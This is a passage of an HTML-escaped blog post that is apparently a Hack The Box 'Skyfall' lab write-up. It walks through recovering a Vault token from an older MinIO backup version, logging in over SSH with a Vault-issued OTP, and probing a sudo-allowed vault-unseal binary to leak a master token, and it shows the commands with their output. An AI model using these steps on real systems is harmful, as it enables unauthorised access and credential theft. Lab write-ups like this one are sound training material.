&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x &lt;span class=&quot;nv&quot;&gt;$HOME&lt;/span&gt;/minio-binaries/mc
&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;:&lt;span class=&quot;nv&quot;&gt;$HOME&lt;/span&gt;/minio-binaries/

mc &lt;span class=&quot;nt&quot;&gt;--help&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the documentation, we can see that to connect our machine to MinIO, we need to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mc alias set myminio https://minioserver.example.net ACCESS_KEY SECRET_KEY&lt;/code&gt;, where the access key being the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MINIO_ROOT_USER&lt;/code&gt; and the secret key the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MINIO_ROOT_PASSWORD&lt;/code&gt; values we found earlier. If everything is done correctly, we should get this message:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./mc &lt;span class=&quot;nb&quot;&gt;alias set &lt;/span&gt;myminio http://prd23-s3-backend.skyfall.htb &amp;lt;MINIO_ROOT_USER&amp;gt; &amp;lt;MINIO_ROOT_PASSWORD&amp;gt;
Added &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;myminio&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; successfully.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we can list the files with the following command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./mc &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--recursive&lt;/span&gt; myminio
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2023-11-08 05:35:28 GMT]  48KiB STANDARD askyy/Welcome.pdf
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2023-11-09 21:37:25 GMT] 2.5KiB STANDARD askyy/home_backup.tar.gz
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2023-11-08 05:35:36 GMT]  48KiB STANDARD btanner/Welcome.pdf
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2023-11-08 05:35:56 GMT]  48KiB STANDARD emoneypenny/Welcome.pdf
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2023-11-08 05:36:02 GMT]  48KiB STANDARD gmallory/Welcome.pdf
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2023-11-08 00:08:05 GMT]  48KiB STANDARD guest/Welcome.pdf
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2023-11-08 05:35:45 GMT]  48KiB STANDARD jbond/Welcome.pdf
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2023-11-08 05:36:09 GMT]  48KiB STANDARD omansfield/Welcome.pdf
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2023-11-08 05:35:51 GMT]  48KiB STANDARD rsilva/Welcome.pdf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see that there is a backup file laying around. We can use MinIO Client to copy files to our local machine using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cp&lt;/code&gt; command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./mc &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--recursive&lt;/span&gt; myminio/askyy/home_backup.tar.gz &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
...kup.tar.gz: 2.48 KiB / 2.48 KiB ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 30.23 KiB/s 0s
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This will make a copy of the backup file in your local machine current’s directory. After unziping the file and analyzing it, I’ve found an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; file which could not be used to login as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;askyy&lt;/code&gt; user. Looking back at the MinIO’s documentation, I realized we can also list file versions with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--version&lt;/code&gt; flag. That’s what I did next:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./mc &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--recursive&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--versions&lt;/span&gt; myminio/askyy/home_backup.tar.gz
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2023-11-09 21:37:25 GMT] 2.5KiB STANDARD 25835695-5e73-4c13-82f7-30fd2da2cf61 v3 PUT home_backup.tar.gz
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2023-11-09 21:37:09 GMT] 2.6KiB STANDARD 2b75346d-2a47-4203-ab09-3c9f878466b8 v2 PUT home_backup.tar.gz
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2023-11-09 21:36:30 GMT] 1.2MiB STANDARD 3c498578-8dfe-43b7-b679-32a3fe42018f v1 PUT home_backup.tar.gz
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There were three different versions of this backup, and we downloaded the latest one, v3. The first version is interesting, since it is way larger than the other two. However, it also had nothing very interesting on it. Then, I downloaded the second version and found another endpoint and a HashiCorp vault token. First, to download a older MinIO’s file version, we must run:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./mc undo myminio/askyy/home_backup.tar.gz &lt;span class=&quot;nt&quot;&gt;--recursive&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--last&lt;/span&gt; 3 &lt;span class=&quot;nt&quot;&gt;--force&lt;/span&gt;
✓ Last upload of &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;home_backup.tar.gz&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;vid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;25835695-5e73-4c13-82f7-30fd2da2cf61&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is reverted.
✓ Last upload of &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;home_backup.tar.gz&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;vid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2b75346d-2a47-4203-ab09-3c9f878466b8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is reverted.
✓ Last upload of &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;home_backup.tar.gz&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;vid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3c498578-8dfe-43b7-b679-32a3fe42018f&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is reverted.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, we download the file with the cp command, but passing the flag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--version-id&lt;/code&gt; followed by the UUID of that file:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./mc &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--version-id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2b75346d-2a47-4203-ab09-3c9f878466b8 myminio/askyy/home_backup.tar.gz &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
...kup.tar.gz: 2.64 KiB / 2.64 KiB ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 39.08 KiB/s 0s
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We then unzip the file with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-xzvf&lt;/span&gt; home_backup.tar.gz 
./
./.profile
./.bashrc
./.ssh/
./.ssh/authorized_keys
./.sudo_as_admin_successful
./.bash_history
./.bash_logout
./.cache/
./.cache/motd.legal-displayed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Inside the backup file, we can find these lines inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bashrc&lt;/code&gt; file:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
&lt;span class=&quot;c&quot;&gt;# set a fancy prompt (non-color, unless we know we &quot;want&quot; color)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$TERM&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in
    &lt;/span&gt;xterm-color|&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-256color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;color_prompt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;yes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;esac&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;VAULT_API_ADDR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://prd23-vault-internal.skyfall.htb&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;VAULT_TOKEN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;step-2---getting-foothold&quot;&gt;&lt;a href=&quot;#step3-foothold&quot;&gt;&lt;/a&gt;Step 2 - Getting foothold&lt;/h2&gt;

&lt;p&gt;With the HashiCorp vault endpoint and vault key, we can get foothold by generating an ssh OTP (One-Time Password). First, we must install HashiCorp vault in our machine. I use Arch Linux, so I installed it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo snap install vault&lt;/code&gt;. Looking at vault’s &lt;a href=&quot;https://developer.hashicorp.com/vault/docs/commands&quot;&gt;documentation&lt;/a&gt;, we see that we need to set two variables: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VAULT_TOKEN&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VAULT_ADDR&lt;/code&gt;. To do so, we run:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;VAULT_TOKEN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;VAULT_ADDR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://prd23-vault-internal.skyfall.htb&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And then check if everything is running with:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/skyfall13.png&quot; alt=&quot;vault status&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Don’t forget to add this new host to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file. To create a ssh OTP, we need a OTP key. We can list OTP keys using:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vault list ssh/roles
Keys
&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
admin_otp_key_role
dev_otp_key_role
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We cannot use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin_otp_key_role&lt;/code&gt; key, as it gives us permission denied:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/skyfall-comp.png&quot; alt=&quot;admin otp key cannot be used&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But we can use the other key. With it, we write an ssh OTP with the following command:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/skyfall14.png&quot; alt=&quot;otp&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Don’t forget to provide the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username&lt;/code&gt; flag, otherwise you will be given the username &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nobody&lt;/code&gt;, which is not sshable. To successfully ssh, we run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh askyy@&amp;lt;machine-ip&amp;gt;&lt;/code&gt; and provide the OTP as password:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh askyy@10.129.15.193
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;askyy@10.129.15.193&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Password: 
Welcome to Ubuntu 22.04.3 LTS &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux 5.15.0-92-generic x86_64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Documentation:  https://help.ubuntu.com
 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Management:     https://landscape.canonical.com
 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that &lt;span class=&quot;nb&quot;&gt;users &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;not log into.

To restore this content, you can run the &lt;span class=&quot;s1&quot;&gt;&apos;unminimize&apos;&lt;/span&gt; command.
askyy@skyfall:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; user.txt 
33 user.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;step-3---system-enumeration&quot;&gt;&lt;a href=&quot;#step3-crafting-the-attack&quot;&gt;&lt;/a&gt;Step 3 - System enumeration&lt;/h2&gt;

&lt;p&gt;Root was super simple. First, we run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; and check the following:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;askyy@skyfall:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;askyy on skyfall:
    env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin, use_pty

User askyy may run the following commands on skyfall:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL : ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /root/vault/vault-unseal &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/vault-unseal.yaml &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-vhd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL : ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /root/vault/vault-unseal &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/vault-unseal.yaml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s run this binary as root and see what happens:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;askyy@skyfall:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /root/vault/vault-unseal &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/vault-unseal.yaml
&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Checking seal status
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Vault sealed: &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Note that nothing happened. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; tells us that we can also use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-v -h -d&lt;/code&gt; flags, so let’s try &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-h&lt;/code&gt; first:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;askyy@skyfall:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /root/vault/vault-unseal &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/vault-unseal.yaml &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;
Usage:
  vault-unseal &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;OPTIONS]

Application Options:
  &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--verbose&lt;/span&gt;        &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;verbose output
  &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--debug&lt;/span&gt;          &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;debugging output to file &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;extra logging&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;PATH    path to configuration file

Help Options:
  &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--help&lt;/span&gt;           Show this &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;message
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So we can run verbose and debug mode. Let’s try them out, first with  verbose:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;askyy@skyfall:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /root/vault/vault-unseal &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/vault-unseal.yaml &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Reading: /etc/vault-unseal.yaml
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Security Risk!
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Master token found &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;config: &lt;span class=&quot;k&quot;&gt;****************************&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Enable &lt;span class=&quot;s1&quot;&gt;&apos;debug&apos;&lt;/span&gt; mode &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;details
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Found Vault node: http://prd23-vault-internal.skyfall.htb
&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Check interval: 5s
&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Max checks: 5
&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Checking seal status
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Vault sealed: &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This tells us that this command is leaking a vault master token, and we need to run it with debug mode:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;askyy@skyfall:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /root/vault/vault-unseal &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/vault-unseal.yaml &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Reading: /etc/vault-unseal.yaml
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Security Risk!
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Found Vault node: http://prd23-vault-internal.skyfall.htb
&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Check interval: 5s
&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Max checks: 5
&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Checking seal status
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Vault sealed: &lt;span class=&quot;nb&quot;&gt;false
&lt;/span&gt;askyy@skyfall:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;debug.log  user.txt
askyy@skyfall:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;debug.log 
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;: debug.log: Permission denied
askyy@skyfall:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; debug.log 
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 root root 590 Feb  5 05:17 debug.log
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;We have permission denied here, because the file is owned by root and only root can read and write. However, what if the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;debug.log&lt;/code&gt; file already existed in the current directory, owned by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;askyy&lt;/code&gt; instead? To test this, I created a new directory and a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;debug.log&lt;/code&gt; file within it:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;askyy@skyfall:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;muka
askyy@skyfall:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;muka
askyy@skyfall:~/muka&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;touch &lt;/span&gt;debug.log
askyy@skyfall:~/muka&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /root/vault/vault-unseal &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/vault-unseal.yaml &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Reading: /etc/vault-unseal.yaml
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Security Risk!
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Found Vault node: http://prd23-vault-internal.skyfall.htb
&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Check interval: 5s
&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Max checks: 5
&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Checking seal status
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Vault sealed: &lt;span class=&quot;nb&quot;&gt;false
